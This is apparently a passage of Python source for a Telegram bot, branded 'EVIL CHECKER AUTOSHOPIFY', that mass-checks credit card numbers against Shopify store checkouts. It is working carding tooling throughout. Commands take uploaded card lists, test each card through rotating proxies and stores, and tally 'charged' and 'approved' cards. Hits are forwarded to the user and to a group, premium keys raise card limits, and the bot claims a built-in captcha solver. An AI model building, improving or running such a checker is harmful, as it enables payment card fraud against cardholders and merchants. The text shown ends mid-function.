@client.on(events.NewMessage(pattern=r'(?i)^[/.]key\s+(\d+)\s+(\d+)$'))
async def generate_key_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("❌ **Admin Only Command!**")
    
    try:
        user_id = int(event.pattern_match.group(1))
        days = int(event.pattern_match.group(2))
        
        if days <= 0:
            return await event.reply("❌ **Invalid days!** Days must be greater than 0.")
        
        # Generate the key first
        key = generate_key()
        
        # Save key data (mark as unused)
        keys_data = load_json_sync(KEYS_FILE)
        keys_data[key] = {
            'user_id': user_id,
            'days': days,
            'generated_by': event.sender_id,
            'generated_at': datetime.datetime.now().isoformat(),
            'used': False,  # Changed to False so it can be redeemed
            'redeemed_by': None,
            'redeemed_at': None
        }
        save_json_sync(KEYS_FILE, keys_data)
        
        try:
            user = await client.get_entity(user_id)
            user_info = f"{user.first_name} (@{user.username})" if hasattr(user, 'username') and user.username else f"User ID: {user_id}"
        except:
            user_info = f"User ID: {user_id}"
        
        await event.reply(f"""✅ **Premium Key Generated Successfully!**

👤 **For User:** {user_info}
🆔 **User ID:** `{user_id}`
⏰ **Duration:** {days} days
🔑 **Key:** `{key}`

📅 **Expiry after redeem:** {days} days from redemption
👑 **Generated by:** Admin

💡 **Note:** User can redeem this key using `/redeem {key}`""")
        
    except Exception as e:
        await event.reply(f"❌ **Error:** {str(e)}")

# --- NEW /redeem COMMAND ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\s+(\w+)$'))
async def redeem_key_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    
    key = event.pattern_match.group(1).strip().upper()
    
    status_msg = await event.reply("🔄 **Validating key...**")
    
    # Check if key exists and is valid
    keys_data = load_json_sync(KEYS_FILE)
    
    if key not in keys_data:
        await status_msg.edit("❌ **Invalid Key!**\n\nThis key does not exist.")
        return
    
    key_data = keys_data[key]
    
    # Check if key already used
    if key_data['used']:
        await status_msg.edit("❌ **Key Already Used!**\n\nThis key has already been redeemed.")
        return
    
    # Check if key is for this user
    if key_data['user_id'] != event.sender_id:
        await status_msg.edit(f"❌ **Key Not For You!**\n\nThis key is for user ID: `{key_data['user_id']}`")
        return
    
    # Add premium to user
    days = key_data['days']
    await add_premium_user(event.sender_id, days)
    
    # Mark key as used
    key_data['used'] = True
    key_data['redeemed_by'] = event.sender_id
    key_data['redeemed_at'] = datetime.datetime.now().isoformat()
    keys_data[key] = key_data
    save_json_sync(KEYS_FILE, keys_data)
    
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    
    await status_msg.edit(f"""✅ **Key Redeemed Successfully!**

🔑 **Key:** `{key}`
⏰ **Duration:** {days} days
📅 **Expiry Date:** {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}
💎 **Premium Activated!**

🎉 **Congratulations!** You now have premium access with:
• 3500 card limit for /mtxt command
• Premium status in private chats
• Enhanced features

Enjoy your premium benefits! 🚀""")

# --- Other missing but required commands ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\s+(.+)$'))
async def remove_site_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    sites_text = event.pattern_match.group(1)
    urls_to_remove = extract_urls_from_text(sites_text)
    
    if not urls_to_remove:
        return await event.reply("❌ No valid URLs found!\n\nFormat: `/rm example.com` or `/rm https://example.com`")
    
    sites_data = load_json_sync(SITE_FILE)
    user_id_str = str(event.sender_id)
    
    if user_id_str not in sites_data or not sites_data[user_id_str]:
        return await event.reply("❌ You haven't added any sites yet!")
    
    user_sites = sites_data[user_id_str]
    removed = []
    not_found = []
    
    for url in urls_to_remove:
        found = False
        for site in user_sites[:]:
            if url in site or site in url:
                user_sites.remove(site)
                removed.append(site)
                found = True
                break
        
        if not found:
            not_found.append(url)
    
    sites_data[user_id_str] = user_sites
    save_json_sync(SITE_FILE, sites_data)
    
    response = f"📊 **Site Removal Results**\n\n"
    
    if removed:
        response += f"✅ **Removed:** {len(removed)} site(s)\n"
        for idx, site in enumerate(removed[:5], 1):
            response += f"{idx}. `{site}`\n"
        if len(removed) > 5:
            response += f"...and {len(removed) - 5} more\n"
    
    if not_found:
        response += f"\n❌ **Not Found:** {len(not_found)} site(s)\n"
        for idx, site in enumerate(not_found[:3], 1):
            response += f"{idx}. {site}\n"
        if len(not_found) > 3:
            response += f"...and {len(not_found) - 3} more\n"
    
    response += f"\n📊 **Remaining Sites:** {len(user_sites)}"
    await event.reply(response)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmsite$'))
async def remove_all_sites_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    sites_data = load_json_sync(SITE_FILE)
    user_id_str = str(event.sender_id)
    
    if user_id_str not in sites_data or not sites_data[user_id_str]:
        return await event.reply("❌ You haven't added any sites yet!")
    
    total_sites = len(sites_data[user_id_str])
    sites_data[user_id_str] = []
    save_json_sync(SITE_FILE, sites_data)
    
    await event.reply(f"""✅ **All Sites Removed!**

🗑️ **Removed:** {total_sites} site(s)
📊 **Remaining:** 0 sites

💡 **Tip:** You can add new sites using `/add example.com`""")

# --- MODIFIED /check COMMAND (AUTO-REMOVE DEAD SITES) ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]check$'))
async def check_sites_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized Access!")
    
    sites_data = load_json_sync(SITE_FILE)
    user_id_str = str(event.sender_id)
    
    if user_id_str not in sites_data or not sites_data[user_id_str]:
        return await event.reply("❌ You haven't added any sites yet!\nUse `/add example.com` to add sites.")
    
    user_sites = sites_data[user_id_str]
    
    if len(user_sites) > 50:
        await event.reply(f"⚠️ **You have {len(user_sites)} sites!** Checking first 50 sites only.")
        user_sites = user_sites[:50]
    
    status_msg = await event.reply(f"🔄 **Checking {len(user_sites)} site(s)...**")
    
    proxy = await get_random_user_proxy(event.sender_id)
    
    results = await test_multiple_sites_optimized(user_sites, proxy=proxy, max_concurrent=3)
    
    working = []
    dead = []
    
    # Create lists of working and dead sites
    for site, result in zip(user_sites, results):
        if result["status"] == "working":
            working.append(f"{site} - {result['response'][:30]}")
        else:
            dead.append(site)  # Store only site names for removal
    
    # Remove dead sites from user's list
    if dead:
        original_count = len(user_sites)
        for dead_site in dead:
            if dead_site in user_sites:
                user_sites.remove(dead_site)
        
        # Update the sites data
        sites_data[user_id_str] = user_sites
        save_json_sync(SITE_FILE, sites_data)
        
        removed_count = original_count - len(user_sites)
    else:
        removed_count = 0
    
    response = f"📊 **Site Check Results**\n\n"
    
    if working:
        response += f"✅ **WORKING:** {len(working)} site(s)\n"
        for idx, site in enumerate(working[:5], 1):
            response += f"{idx}. {site}\n"
        if len(working) > 5:
            response += f"...and {len(working) - 5} more\n"
    
    if dead:
        response += f"\n❌ **DEAD & REMOVED:** {removed_count} site(s)\n"
        for idx, site in enumerate(dead[:5], 1):
            response += f"{idx}. `{site}`\n"
        if len(dead) > 5:
            response += f"...and {len(dead) - 5} more\n"
    
    response += f"\n📊 **Total Sites Now:** {len(user_sites)} sites"
    
    if removed_count > 0:
        response += f"\n\n⚠️ **Note:** {removed_count} dead site(s) have been automatically removed from your list."
    
    await status_msg.edit(response)

# --- UPDATED /mtxt Command with NEW UI and FEATURES ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt_command(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+hHylRLru9js1ODk1")], [Button.url("📢 Join Channel", "https://t.me/+lUch4HwcoeE0Nzg1")]]
        return await event.reply("🚫 Unauthorized Access!\n\nYou must join both group and channel to use this bot!", buttons=buttons)
    
    user_proxies = await get_user_proxies(event.sender_id)
    if not user_proxies:
        return await event.reply("❌ **Proxy Required!**\n\nYou must add a proxy first using `/proxy <proxy>`\n\nExample: `/proxy 45.186.6.104:3128`")
    
    sites_data = load_json_sync(SITE_FILE)
    user_sites = sites_data.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("❌ **No Sites Found!**\n\nYou must add sites first using `/add <site>` or `/setsite`")
    
    if not event.reply_to_msg_id:
        return await event.reply("📁 **Reply to a TXT file!**\n\nPlease reply to a .txt file containing CCs with `/mtxt`")
    
    replied_msg = await event.get_reply_message()
    if not replied_msg.document:
        return await event.reply("❌ **Please reply to a document file!**")
    
    file_name = replied_msg.document.attributes[0].file_name.lower() if replied_msg.document.attributes else ""
    
    if not file_name.endswith('.txt'):
        return await event.reply("❌ **Only TXT files are supported!**")
    
    status_msg = await event.reply("📥 **Downloading file...**")
    file_path = await replied_msg.download_media()
    
    def read_cards_from_file(path):
        cards = set()
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                cards = extract_all_cards(content)
            
            os.remove(path)
            return list(cards)
        except Exception as e:
            print(f"Error reading file: {e}")
            return []
    
    cards = await run_in_thread(read_cards_from_file, file_path)
    
    if not cards:
        await status_msg.edit("❌ **No valid cards found in the file!**")
        return
    
    max_cards = get_cc_limit(access_type, event.sender_id, event.chat_id)
    if len(cards) > max_cards:
        cards = cards[:max_cards]
        await status_msg.edit(f"⚠️ **Limiting to {max_cards} cards** (your limit)\n\nProcessing {len(cards)} cards...")
    else:
        await status_msg.edit(f"🔄 **Found {len(cards)} cards**\n\nProcessing...")
    
    # Get user info for display
    try:
        user = await client.get_entity(event.sender_id)
        user_name = user.first_name or "Unknown"
    except:
        user_name = "User"
    
    # Generate session ID
    session_id = generate_session_id()
    
    process_id = f"{event.sender_id}_{int(time.time())}"
    ACTIVE_MTXT_PROCESSES[process_id] = {
        'user_id': event.sender_id,
        'total_cards': len(cards),
        'processed': 0,
        'charged': 0,
        'approved': 0,
        'declined': 0,
        'dead': 0,
        'error': 0,
        'start_time': time.time(),
        'current_card': "",
        'last_response': "",
        'session_id': session_id,
        'status_msg_id': None,
        'user_name': user_name
    }
    
    # Store session info for stopping
    ACTIVE_SESSIONS[session_id] = {
        'process_id': process_id,
        'user_id': event.sender_id,
        'start_time': time.time()
    }
    
    asyncio.create_task(process_mtxt_file_optimized(event, process_id, session_id, cards, user_sites, user_proxies))

# --- NEW /stop COMMAND to stop session ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop\s+(\w+)$'))
async def stop_session_command(event):
    session_id = event.pattern_match.group(1).strip().upper()
    
    # Check if session exists
    if session_id not in ACTIVE_SESSIONS:
        await event.reply(f"❌ **Session ID `{session_id}` not found!**\n\nIt may have already completed or been stopped.")
        return
    
    session_info = ACTIVE_SESSIONS[session_id]
    
    # Check permissions: only owner or session owner can stop
    if event.sender_id != OWNER_ID and event.sender_id != session_info['user_id']:
        await event.reply("❌ **Permission Denied!**\n\nYou can only stop your own sessions.")
        return
    
    process_id = session_info['process_id']
    
    # Stop the process
    if process_id in ACTIVE_MTXT_PROCESSES:
        del ACTIVE_MTXT_PROCESSES[process_id]
    
    # Remove session
    del ACTIVE_SESSIONS[session_id]
    
    # Get user info
    try:
        user = await client.get_entity(session_info['user_id'])
        user_name = user.first_name or "Unknown"
    except:
        user_name = "Unknown"
    
    await event.reply(f"""✅ **Session Stopped Successfully!**

🔑 **Session ID:** `{session_id}`
👤 **User:** {user_name}
🆔 **User ID:** `{session_info['user_id']}`
⏱️ **Duration:** {time.time() - session_info['start_time']:.2f}s
👑 **Stopped by:** {'Owner' if event.sender_id == OWNER_ID else 'User'}

📊 **Session terminated manually.**""")

# --- UPDATED mtxt processing with NEW UI ---
async def process_mtxt_file_optimized(event, process_id, session_id, cards, user_sites, user_proxies):
    """Process MTXT file with rate limiting and updated UI"""
    try:
        if process_id not in ACTIVE_MTXT_PROCESSES:
            return
        
        process_info = ACTIVE_MTXT_PROCESSES[process_id]
        total_cards = len(cards)
        start_time = time.time()
        
        # Get user info
        user_name = process_info['user_name']
        developer = "𝐄𝐕𝐈𝐋 𝐄𝐑𝐀"  # Fixed developer name
        
        # Results storage for final file
        charged_cards = []
        approved_cards = []
        declined_cards = []
        error_cards = []
        
        # Create initial status message with new UI
        status_text = f"""⊀ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ `{session_id}`
⊀ 𝐆𝚊𝐭𝐞𝐰𝚊𝚢 ↬ Shopify Rnd. Charge
⊀ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ {total_cards}
⊀ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ↬ 0/{total_cards}
⊀ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ 0
⊀ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ 0
⊀ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ 0
⊀ 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ 0
⊀ 𝐓𝐢𝐦𝐞 ↬ 0s ⏱️
⊀ 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ {user_name}
⌬ 𝐃𝐞𝐯 ↬ {developer}"""
        
        status_msg = await event.reply(
            status_text,
            buttons=[[Button.inline("⛔ 𝐒𝐭𝐨𝐩", f"stop_session:{session_id}".encode())]]
        )
        
        # Store status message ID for updates
        process_info['status_msg_id'] = status_msg.id
        
        # Process each card
        for i, card in enumerate(cards):
            if process_id not in ACTIVE_MTXT_PROCESSES:
                break
            
            # Update current progress
            process_info['processed'] = i + 1
            process_info['current_card'] = card
            
            # Get random proxy for this check
            proxy = random.choice(user_proxies) if user_proxies else None
            
            # Try with multiple sites if one fails
            max_retries = 3
            result = None
            site_used = None
            
            for retry in range(max_retries):
                if process_id not in ACTIVE_MTXT_PROCESSES:
                    break
                
                # Get random site
                site = random.choice(user_sites) if user_sites else None
                
                if not site:
                    process_info['error'] += 1
                    error_cards.append(f"{card} - No sites available")
                    break
                
                try:
                    # Check card with current site
                    result = await check_card_specific_site(card, site, proxy)
                    site_used = site
                    
                    if isinstance(result, Exception):
                        result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}
                    
                    response_text = result.get("Response", "").lower()
                    
                    # If site is dead, retry with different site
                    if is_site_dead(result.get("Response", "")):
                        if retry < max_retries - 1:
                            continue  # Try with different site
                        else:
                            process_info['dead'] += 1
                            result["Response"] = "Site Dead - All retries failed"
                            break
                    else:
                        break  # Site is working, break retry loop
                        
                except Exception as e:
                    if retry < max_retries - 1:
                        continue  # Retry with different site
                    else:
                        process_info['error'] += 1
                        error_cards.append(f"{card} - Error: {str(e)[:50]}")
                        result = {"Response": f"Error: {str(e)[:50]}", "Price": "-", "Gateway": "-"}
                        break
            
            if not result:
                continue
            
            # Process result
            response_text = result.get("Response", "").lower()
            
            if "proxy_required" in response_text:
                process_info['error'] += 1
                error_cards.append(f"{card} - Proxy required")
                continue
            
            if is_site_dead(result.get("Response", "")):
                process_info['dead'] += 1
                result["Response"] = "Site Dead"
            elif "thank you" in response_text or "payment successful" in response_text:
                process_info['charged'] += 1
                charged_cards.append({
                    'card': card,
                    'gateway': result.get('Gateway', 'Shopify'),
                    'price': result.get('Price', 'Unknown'),
                    'response': result.get('Response', 'Thank You'),
                    'site': site_used
                })
                
                # Save approved card
                await save_approved_card(card, "Charged", result.get('Response'), result.get('Gateway'), result.get('Price'))
                
                # Send charged card to user via DM
                await send_charged_card_to_user(
                    event.sender_id, 
                    card, 
                    result.get('Gateway', 'Shopify'),
                    result.get('Price', 'Unknown'),
                    result.get('Response', 'Thank You')
                )
                
                # Send hit notification to group
                await send_hit_notification(
                    card,
                    result.get('Gateway', 'Shopify'),
                    result.get('Price', 'Unknown'),
                    result.get('Response', 'Thank You'),
                    event.sender_id,
                    user_name
                )
                
            elif any(key in response_text for key in [
                "incorrect_zip", "card decline", "3dcc", "ccn", 
                "incorrect card number", "card cvv", "card ccn",
                "approved", "success", "incorrect_cvv", "invalid_cvv", 
                "incorrect_cvc", "invalid_cvc", "insufficient funds"
            ]):
                process_info['approved'] += 1
                approved_cards.append({
                    'card': card,
                    'gateway': result.get('Gateway', 'Shopify'),
                    'price': result.get('Price', 'Unknown'),
                    'response': result.get('Response', 'Approved')
                })
                
                await save_approved_card(card, "Approved", result.get('Response'), result.get('Gateway'), result.get('Price'))
                
                if "incorrect_zip" in response_text:
                    # Send hit notification for incorrect zip
                    await send_hit_notification(
                        card,
                        result.get('Gateway', 'Shopify'),
                        result.get('Price', 'Unknown'),
                        result.get('Response', 'Approved'),
                        event.sender_id,
                        user_name
                    )
            else:
                process_info['declined'] += 1
                declined_cards.append({
                    'card': card,
                    'gateway': result.get('Gateway', 'Unknown'),
                    'price': result.get('Price', '-'),
                    'response': result.get('Response', 'Declined')
                })
            
            # Update UI every 5 cards or 10 seconds
            if (i + 1) % 5 == 0 or (i + 1) == total_cards:
                elapsed_time = time.time() - start_time
                
                # Update status message
                status_text = f"""⊀ 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐈𝐃 ↬ `{session_id}`
⊀ 𝐆𝚊𝐭𝐞𝐰𝚊𝚢 ↬ Shopify Rnd. Charge
⊀ 𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬 ↬ {total_cards}
⊀ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ↬ {i+1}/{total_cards}
⊀ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ↬ {process_info['charged']}
⊀ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ↬ {process_info['approved']}
⊀ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ↬ {process_info['declined']}
⊀ 𝐄𝐫𝐫𝐨𝐫 𝐂𝚊𝐫𝐝𝐬 ⚠️ ↬ {process_info['error']}
⊀ 𝐓𝐢𝐦𝐞 ↬ {elapsed_time:.1f}s ⏱️
⊀ 𝐂𝐡𝐞𝐜𝐤 𝐁𝐲 ↬ {user_name}
⌬ 𝐃𝐞𝐯 ↬ {developer}"""
                
                try:
                    await status_msg.edit(
                        status_text,
                        buttons=[[Button.inline("⛔ 𝐒𝐭𝐨𝐩", f"stop_session:{session_id}".encode())]]
                    )
                except:
                    pass
            
            # Add small delay to prevent rate limiting
            await asyncio.sleep(0.3)
        
        # Final update and create results file
        if process_id in ACTIVE_MTXT_PROCESSES:
            elapsed_time = time.time() - start_time
            
            # Create results file
            results_content = f"""╔══════════════════════════════════╗
║     𝐄𝐕𝐈𝐋 𝐗 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐂𝐇𝐄𝐂𝐊 𝐑𝐄𝐒𝐔𝐋𝐓𝐒     ║
╚══════════════════════════════════╝

📅 Check Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 Checked By: {user_name}
🆔 User ID: {event.sender_id}
🔑 Session ID: {session_id}
⏱️ Total Time: {elapsed_time:.2f}s

📊 𝐒𝐔𝐌𝐌𝐀𝐑𝐘:
├─ Total Cards: {total_cards}
├─ Charged 🔥: {process_info['charged']}
├─ Approved ✅: {process_info['approved']}
├─ Declined ❌: {process_info['declined']}
├─ Dead Sites ⚠️: {process_info['dead']}
└─ Error Cards ⚠️: {process_info['error']}

════════════════════════════════════

🎯 𝐂𝐇𝐀𝐑𝐆𝐄𝐃 𝐂𝐀𝐑𝐃𝐒 ({process_info['charged']}):
════════════════════════════════════\n"""
            
            if charged_cards:
                for idx, card_data in enumerate(charged_cards, 1):
                    results_content += f"\n{idx}. {card_data['card']}"
                    results_content += f"\n   Gateway: {card_data['gateway']}"
                    results_content += f"\n   Price: {card_data['price']}"
                    results_content += f"\n   Response: {card_data['response'][:50]}"
                    results_content += f"\n   Site: {card_data.get('site', 'Random')}\n"
            else:
                results_content += "\nNo charged cards found.\n"
            
            results_content += f"\n════════════════════════════════════\n"
            results_content += f"✅ 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐀𝐑𝐃𝐒 ({process_info['approved']}):\n"
            results_content += f"════════════════════════════════════\n"
            
            if approved_cards:
                for idx, card_data in enumerate(approved_cards, 1):
                    results_content += f"\n{idx}. {card_data['card']}"
                    results_content += f"\n   Gateway: {card_data['gateway']}"
                    results_content += f"\n   Response: {card_data['response'][:50]}\n"
            else:
                results_content += "\nNo approved cards found.\n"
            
            results_content += f"\n════════════════════════════════════\n"
            results_content += f"⚠️ 𝐄𝐑𝐑𝐎𝐑 𝐂𝐀𝐑𝐃𝐒 ({process_info['error']}):\n"
            results_content += f"════════════════════════════════════\n"
            
            if error_cards:
                for idx, error in enumerate(error_cards[:20], 1):
                    results_content += f"\n{idx}. {error}\n"
                if len(error_cards) > 20:
                    results_content += f"\n... and {len(error_cards) - 20} more error cards\n"
            else:
                results_content += "\nNo error cards.\n"
            
            # Save results to file
            with open(RESULTS_FILE, 'w', encoding='utf-8') as f:
                f.write(results_content)
            
            # Send final message with results file
            final_text = f"""✅ **MASS CHECK COMPLETE!**

📊 **Session Summary:**
├─ 🔑 **Session ID:** `{session_id}`
├─ 📅 **Date:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
├─ 👤 **User:** {user_name}
├─ 🆔 **User ID:** `{event.sender_id}`
├─ ⏱️ **Time:** {elapsed_time:.2f}s
└─ 📊 **Cards:** {total_cards}

🎯 **Results:**
├─ 🔥 **Charged:** {process_info['charged']}
├─ ✅ **Approved:** {process_info['approved']}
├─ ❌ **Declined:** {process_info['declined']}
├─ ⚠️ **Dead Sites:** {process_info['dead']}
└─ ⚠️ **Errors:** {process_info['error']}

💡 **Note:** Charged cards have been sent to your DM.
📁 **Results file:** `EVILXCHK.txt` attached below."""

            # Send final message with file
            await status_msg.delete()
            await event.reply(
                final_text,
                file=RESULTS_FILE
            )
            
            # Clean up
            if process_id in ACTIVE_MTXT_PROCESSES:
                del ACTIVE_MTXT_PROCESSES[process_id]
            if session_id in ACTIVE_SESSIONS:
                del ACTIVE_SESSIONS[session_id]
                
    except Exception as e:
        print(f"Error in mtxt processing: {e}")
        if process_id in ACTIVE_MTXT_PROCESSES:
            del ACTIVE_MTXT_PROCESSES[process_id]
        if session_id in ACTIVE_SESSIONS:
            del ACTIVE_SESSIONS[session_id]

# --- Inline button handler for stopping session ---
@client.on(events.CallbackQuery(pattern=rb'stop_session:(\w+)'))
async def stop_session_handler(event):
    session_id = event.pattern_match.group(1).decode()
    
    # Check if session exists
    if session_id not in ACTIVE_SESSIONS:
        await event.answer("❌ Session not found!", alert=True)
        return
    
    session_info = ACTIVE_SESSIONS[session_id]
    
    # Check permissions: only owner or session owner can stop
    if event.sender_id != OWNER_ID and event.sender_id != session_info['user_id']:
        await event.answer("❌ Permission Denied! You can only stop your own sessions.", alert=True)
        return
    
    process_id = session_info['process_id']
    
    # Stop the process
    if process_id in ACTIVE_MTXT_PROCESSES:
        del ACTIVE_MTXT_PROCESSES[process_id]
    
    # Remove session
    del ACTIVE_SESSIONS[session_id]
    
    # Get user info
    try:
        user = await client.get_entity(session_info['user_id'])
        user_name = user.first_name or "Unknown"
    except:
        user_name = "Unknown"
    
    await event.edit(
        f"""⛔ **SESSION STOPPED**

🔑 **Session ID:** `{session_id}`
👤 **User:** {user_name}
🆔 **User ID:** `{session_info['user_id']}`
⏱️ **Duration:** {time.time() - session_info['start_time']:.2f}s
👑 **Stopped by:** {'Owner' if event.sender_id == OWNER_ID else 'User'}

📊 **Session terminated by user request.**"""
    )
    await event.answer("✅ Session stopped successfully!")

# --- Bot Command Handlers ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    if not await check_membership_and_reply(event):
        return
    
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())

    text = """🚀 **𝐄𝐕𝐈𝐋 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐀𝐔𝐓𝐎𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓!**

Here are the available command categories.

** Shopify Self **
`/sh` ⇾ Check a single CC.
`/msh` ⇾ Check multiple CCs from text.
`/mtxt` ⇾ Check CCs from a `.txt` file (OPTIMIZED SPEED).

** Site Management **
`/add` <site> ⇾ Add site(s) to your DB (checks if working first).
`/setsite` ⇾ Upload a file with sites to test and add working ones. (UNLIMITED SITES)
`/mysites` ⇾ Show your saved sites.
`/check` ⇾ Test your saved sites (dead sites auto-removed).
`/rm` <site> ⇾ Remove specific site(s).
`/rmsite` ⇾ Remove ALL your sites.

** Session Control **
`/stop` <session_id> ⇾ Stop your running session.

** Proxy Commands **
`/proxy` <proxy> ⇾ Add and test a proxy.
`/myproxy` ⇾ Show your added proxies.
`/rmproxy` ⇾ Remove all your proxies.

** User Management **
`/info` ⇾ Get your user information.
`/redeem` <key> ⇾ Redeem a premium key.
"""

    if access_type in ["premium_private", "premium_group"]:
        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id, event.chat_id)}` CCs)"
    elif access_type == "authorized_group":
        text += f"\n👥 **Status:** Authorized Group (`{get_cc_limit(access_type, event.sender_id, event.chat_id)}` CCs)"
    else:
        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id, event.chat_id)}` CCs)"
    
    text += f"\n\n⚠️ **Note:** Proxy is REQUIRED for CC checking commands (/sh, /msh, /mtxt)"
    text += f"\n🔐 **Captcha Solver:** Built-in (All captchas auto-solved)"
    text += f"\n⏱️ **Timeout:** 30 seconds per request"
    text += f"\n🎯 **New Feature:** Charged cards sent to DM, hit notifications to group"
    
    if event.sender_id in ADMIN_ID:
        text += f"\n\n👑 **ADMIN COMMANDS:**"
        text += f"\n`/key <user_id> <days>` ⇾ Generate premium key"
        text += f"\n`/au <group_id>` ⇾ Authorize group (200 limit)"
        text += f"\n`/rm <user_id>` ⇾ Remove premium"
        text += f"\n`/pmall` ⇾ Show all premium users"
        text += f"\n`/status` ⇾ Bot status"

    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    if not await check_membership_and_reply(event):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": 
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+hHylRLru9js1ODk1")], [Button.url("📢 Join Channel", "https://t.me/+lUch4HwcoeE0Nzg1")]]
        return await event.reply("🚫 Unauthorized Access!\n\nYou must join both group and channel to use this bot!\n\nFor private access, contact @DARK_FROXT_73", buttons=buttons)
    
    user_proxies = await get_user_proxies(event.sender_id)
    if not user_proxies:
        return await event.reply("❌ **Proxy Required!**\n\nYou must add a proxy first using `/proxy <proxy>`\n\nExample: `/proxy 45.186.6.104:3128`")
    
    asyncio.create_task(process_sh_card_optimized(event, access_type))

async def process_sh_card_optimized(event, access_type):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: 
            card = extract_card(replied_msg.text)
        if not card: 
            return await event.reply("Couldn't extract valid card info from replied message\n\nFormat ➜ /sh 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card: 
            return await event.reply("Format ➜ /sh 4111111111111111|12|2025|123\n\nOr reply to a message containing credit card info", parse_mode="markdown")
    
    sites = load_json_sync(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: 
        return await event.reply("You haven't added any URLs. First add using /add")
    
    proxy = await get_random_user_proxy(event.sender_id)
    
    loading_msg = await event.reply("🍳")
    start_time = time.time()
    
    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except: 
                break
    
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        res, site_index = await check_card_random_site(card, user_sites, proxy)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        
        if "proxy_required" in res.get("Response", "").lower():
            await loading_msg.delete()
            return await event.reply(f"❌ **Proxy Required!**\n\nYou must add a working proxy using `/proxy <proxy>`\n\nExample: `/proxy 45.186.6.104:3128`")
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        response_text = res.get("Response", "").lower()
        
        if is_site_dead(res.get("Response", "")):
            status_header = "DEAD SITE ⚠️"
            res["Response"] = "Site configuration error - please remove this site"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "CHARGED 💎"
            status_result = "Charged"
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
            await forward_to_hits_group(card, res.get('Response'), res.get('Gateway'), res.get('Price'), site_index, event.sender_id)
        elif any(key in response_text for key in [
            "incorrect_zip", "card decline", "3dcc", "ccn", 
            "incorrect card number", "card cvv", "card ccn",
            "approved", "success", "incorrect_cvv", "invalid_cvv", 
            "incorrect_cvc", "invalid_cvc", "insufficient funds"
        ]):
            status_header = "APPROVED ✅"
            status_result = "Approved"
